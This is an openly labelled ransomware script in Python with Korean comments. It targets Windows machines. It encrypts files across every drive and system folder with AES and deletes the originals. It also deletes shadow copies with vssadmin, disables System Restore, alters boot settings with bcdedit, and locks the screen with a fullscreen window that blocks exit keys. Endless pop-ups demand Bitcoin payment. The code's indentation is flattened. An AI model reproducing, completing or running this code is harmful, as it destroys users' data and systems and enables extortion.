import tkinter as tk
import ctypes
import winsound
import time
import random
import os
import sys
import threading
import subprocess
import shutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import string

============================================
1. 초강력 파일 암호화 (Ransomware) - 시스템 폴더 포함 + 복구 방지
============================================

ENCRYPTION_KEY = base64.b64decode("YjdjOWY0YTBkMTNlNmE1Yzg5ZWYyNDcxYmM5MGQ4NGYzYWExNzYyZTVkYzliNDFmOGU3MDNjNmRhNTFiZjkyOA==")

암호화 대상 확장자 (거의 모든 파일 + 추가)
TARGET_EXTENSIONS = [
'.exe', '.dll', '.sys', '.msi', '.com', '.scr', '.drv', '.ocx', '.cpl',
'.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.ico', '.svg', '.webp',
'.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.cab', '.msu', '.bz2', '.xz',
'.mp3', '.wav', '.flac', '.wma', '.aac', '.ogg', '.m4a', '.opus',
'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.3gp',
'.py', '.cpp', '.c', '.java', '.js', '.html', '.css', '.php', '.asp', '.jsp', '.rb', '.go', '.rs', '.swift', '.kt',
'.db', '.sqlite', '.mdb', '.accdb', '.sql', '.dbf', '.fdb',
'.psd', '.ai', '.eps', '.indd', '.sketch', '.xd', '.fig',
'.pem', '.key', '.crt', '.cer', '.pfx', '.p12', '.csr',
'.ovpn', '.conf', '.config', '.ini', '.log', '.cfg', '.yaml', '.yml', '.json', '.xml',
'.bat', '.cmd', '.ps1', '.vbs', '.js', '.jar', '.apk', '.appx', '.msix', '.deb', '.rpm',
'.bak', '.old', '.tmp', '.cache', '.dat', '.lock', '.pid',
'.vhd', '.vmdk', '.vdi', '.qcow2', '.ova', '.ovf',
'.pst', '.ost', '.msg', '.eml', '.mbox',
'.torrent', '.part', '.crdownload'
]

def encrypt_file(file_path, retries=3):
for attempt in range(retries):
try:
if not os.path.exists(file_path) or not os.access(file_path, os.W_OK):
return False

if os.path.getsize(file_path) > 10 * 1024 * 1024:
return False

with open(file_path, 'rb') as f:
data = f.read()

if len(data) == 0:
return False

cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
ct_bytes = cipher.encrypt(pad(data, AES.block_size))

encrypted_path = file_path + '.encrypted'
with open(encrypted_path, 'wb') as f:
f.write(cipher.iv)
f.write(ct_bytes)

try:
os.remove(file_path)
except:
with open(file_path, 'wb') as f:
f.write(os.urandom(os.path.getsize(encrypted_path)))
os.remove(file_path)
return True
except Exception:
time.sleep(0.1)
continue
return False

def ransomware_attack():
encrypted_count = 0
error_count = 0

drives = []
for letter in string.ascii_uppercase:
drive_path = letter + ':\'
if os.path.exists(drive_path):
drives.append(drive_path)

target_folders = []
for drive in drives:
target_folders.extend([
drive,
drive + 'Windows',
drive + 'Program Files',
drive + 'Program Files (x86)',
drive + 'Users',
drive + 'ProgramData',
drive + 'System32',
drive + 'SysWOW64',
drive + 'Temp',
drive + 'PerfLogs',
drive + 'inetpub',
drive + 'Recovery',
 ])

try:
users_path = os.environ.get('USERPROFILE', '')
if users_path:
users_dir = os.path.dirname(users_path)
if os.path.exists(users_dir):
for user in os.listdir(users_dir):
user_folder = os.path.join(users_dir, user)
if os.path.isdir(user_folder):
target_folders.append(user_folder)
except:
pass

existing_folders = []
for f in target_folders:
if f and os.path.exists(f):
existing_folders.append(f)

skip_folders = ['System Volume Information', '$Recycle.Bin', 'Boot', 'Recovery', 'Config.Msi', 'Cache']

for folder in existing_folders:
try:
for root, dirs, files in os.walk(folder):
if any(skip in root for skip in skip_folders):
continue

depth = root.replace(folder, '').count(os.sep)
if depth > 8:
continue

for file in files:
ext = os.path.splitext(file)[1].lower()
if ext in TARGET_EXTENSIONS:
file_path = os.path.join(root, file)
try:
if encrypt_file(file_path):
encrypted_count += 1
time.sleep(0.0005)
except Exception:
error_count += 1
except Exception:
continue

return encrypted_count, error_count

============================================
2. 시스템 파괴 추가 기능 (복구 방지)
============================================

def destroy_system():
try:
os.system('vssadmin delete shadows /all /quiet')
except:
pass

try:
import winreg
key = winreg.HKEY_LOCAL_MACHINE
subkey = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"
try:
handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(handle, "DisableSR", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(handle)
except:
pass
except:
pass

try:
os.system('bcdedit /set {default} safeboot minimal')
os.system('bcdedit /set {default} safebootalternateshell yes')
except:
pass

============================================
3. 킬스크린 GUI (초강력 버전)
============================================

winsound.MessageBeep(winsound.MB_ICONHAND)

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.bind('<Escape>', lambda e: None)

ascii_art = r"""
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@%@%@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%@@@@@@@@@@@%%%%@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%%%@@%@%@@@@@%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%@%@@%@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%@@@@@@@@@@%@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%###@@@@@@@@%@%@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@%%@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@###%@@@@@@%%%#%%%@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%@@%####+-#%@@%@@%+#=##%@@%@@@@%#%@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%@%@##++-=#@%%#%%=+=+=#@%#@@@@###@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%%@%%@%%%#%%##%%%%#=+====++#%%#%%@++@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@%%%#*%%%%##%###%%%#+**+++##%%%%###%#+#%@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@%+###++++++##=+=#+*####+++#@@@@@@@@@@@@@@@@@
@@@@@@@@@-#@@@@-=+###%%@@@@@#+=+#==::-+++==+===++##**@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%=--+#%@@@@@@@@@@%##++=:.::-==+@@@@@@@@@@%#+#@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@#-:--:::+#@@@@@%%%%:---:..::-:-%%@@@@@@@@@@#++++%@@@@@@%%@@@@@@@
@@@@@@@@@@@@@@@#=:::::-==++---:::::..:::::::=%%@@%+====++#@@@@@@@%@@@@@@@
@@@@@@@@@@@@@@@@+-::::::::---:::.:::::...:::::::::---==---=-==++#@@@@@@%@@@@@@@@
@@@@@@@@@@@@@@@@-::::::::::::....:......::::::::::::::::---==+%@@@@%#%@@@@@@@@
@@@@@@@@@@@@@@@@%=-:-::::.....:.:-:.......:---:::::.::::::---=+#@@@@@#%@@@@@@@@@
@@@@@@@@@@@@@@%%%+=--:::.....:::-:....:::::----::::::::::::-=+%@@@@%%@@@@@@@@@@
@@@@@@@@@@@@@@@%%+=---:::::::::=:-+++=+==----::::::::---++%@@@%#%@@@@@@@@@@@
@@@@@@@@@@@@@@@@@%++==----::---+%%@@@%%%@@@%#------::--==++#%@@%#%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#+==-------###%@@@%%%@-----=---==++%@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%##++=----------==---:::---=====++#@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%####++++++=====::-========++++++#%@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%%#######%%%@@@@@%@@@@%###++++####@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%%#####++=+-.::::.:--%@@%####%%@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%%@@@%%#+##%%@@@%%#+++#%####%%%@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%+#%@@@@%%####%%%###%%%###%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@--+#%%@@@@@@%%%###++####%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@#=:--=##%%@@@@@@@@%%####%%#####%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%=:.:--==##%%@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@
@@@@@@@%=:::.:::--=+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%#%@@@@@@@@@@@@@@@
@@@@#=:::::::::::--=+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#+++===+#@@@@@@@@@@@@
@#-:::::..:::::::::-++##%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%##+=--=-=---=*%@@@@@@@@@
:::::.::::::::::::--=+#%%%%@@@@@@@@@@@@@@@@@@@@@@@@%%##+=-==----==+++#%@@@@@@
::::-:--------==+++##%%%@@@@@@@@@@@@@@@@@@@@@@@@@@%%####+====+++++#@@@@@
:-------=-----==+**#####%%%%%@@@@@@@@@@@@@@@@@@@@@@@%%%###+++==++++#%@@@
:-------=-----====+*####%%%%@@@@@@@@@@@@@@@@@@@@@%%###+++++++++###%@@
--=-==++==-----====+==+###%%%@@@@@@@@@@@@@@@@@@%%##+++++++**#####@@
=+++++++=------===+===++##%%%%@@@@@@@%%%%%%%%##*****++++++***#######%@
****####+==-----+=====++++#######%%%%%%#%%###++++***+++*********#####%%%@
"""

message = """

THAT'S ALL! I GAVE YOU THE LAST CHANCE TO SHUT DOWN
THIS FUCKING PC, AND YOU FUCKED IT UP!!!!!
NOW YOU ARE IN A VERY VERY VERY VERY BIG TROUBLE!

ALL YOUR FILES HAVE BEEN ENCRYPTED WITH AES-256!
SYSTEM RESTORE POINTS DELETED!
RECOVERY OPTIONS DISABLED!

F1 - Shut Down (진짜 재부팅)
F2 - 복호화 시도 (가짜)

"""

label = tk.Label(root, text=ascii_art + message, font=("Consolas", 8), fg="red", bg="black")
label.pack(expand=True, fill='both')

def flicker():
current_color = label.cget('fg')
next_color = 'red' if current_color == 'red' else '#440000'
label.config(fg=next_color)
root.after(200, flicker)
flicker()

def real_reboot(event):
os.system('shutdown /r /t 0 /f')
root.bind('<F1>', real_reboot)

def fake_decrypt(event):
messages = [
"복호화 키가 없습니다! 0.001 BTC를 지불하세요.",
"지불하지 않으면 모든 파일이 영원히 사라집니다!",
"남은 시간: 24시간! 지금 즉시 지불하세요!",
"당신의 모든 데이터는 암호화되었습니다!",
"복구 불가능합니다! BTC를 지불하세요!"
 ]
for _ in range(10):
ctypes.windll.user32.MessageBoxW(0, random.choice(messages), "RANSOMWARE", 0x10)
time.sleep(0.1)
root.bind('<F2>', fake_decrypt)

def block_keys(event):
return "break"
root.bind_all('<Control-Alt-Delete>', block_keys)
root.bind_all('<Alt-F4>', block_keys)
root.bind_all('<Control-Shift-Escape>', block_keys)

def prevent_exit():
try:
root.mainloop()
except:
pass
os.system('python "{}"'.format(file))
sys.exit()

============================================
3. 무한 팝업 + 암호화 실행 (강화)
============================================

def popup_loop():
messages = [
"파일이 암호화되었습니다! 복호화 키를 얻으려면 0.001 BTC를 지불하세요.",
"모든 파일이 잠겼습니다! 지불하지 않으면 영원히 잃게 됩니다!",
"당신의 데이터는 암호화되었습니다! 복구를 위해 BTC를 지불하세요.",
"시스템이 손상되었습니다! 복구하려면 BTC를 지불하세요.",
"당신은 함정에 빠졌습니다! 지불하세요!"
 ]
while True:
time.sleep(1)
ctypes.windll.user32.MessageBoxW(0, random.choice(messages), "RANSOMWARE", 0x10)
threading.Thread(target=popup_loop, daemon=True).start()

============================================
4. 실행 (강화)
============================================

def start_ransomware():
destroy_system()

count, errors = ransomware_attack()

result_msg = f"""암호화 완료!

암호화된 파일: {count}개
오류 발생: {errors}개

모든 중요한 파일이 AES-256으로 암호화되었습니다.
시스템 복구 옵션이 비활성화되었습니다.

복호화 키를 얻으려면 지정된 BTC 주소로 지불하세요.

지불하지 않으면 모든 데이터가 영원히 사라집니다!"""

ctypes.windll.user32.MessageBoxW(0, result_msg, "RANSOMWARE", 0x10)
threading.Thread(target=start_ransomware, daemon=True).start()

prevent_exit()